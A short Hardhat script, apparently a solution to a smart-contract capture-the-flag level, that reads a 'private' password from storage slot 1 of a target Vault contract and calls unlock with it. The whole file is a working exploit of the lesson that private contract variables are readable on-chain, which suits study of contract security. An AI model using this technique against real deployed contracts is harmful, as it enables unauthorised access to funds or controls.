import {ethers} from "hardhat"
import dotenv from 'dotenv'

dotenv.config()

async function main() {
    const instanceAddress = process.env.TARGET_ADDRESS_9!
    const password = await ethers.provider.getStorage(instanceAddress, 1)
    console.log(`password: ${password}`)
    const vault = await ethers.getContractAt('Vault', instanceAddress)
    await vault.unlock(password)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
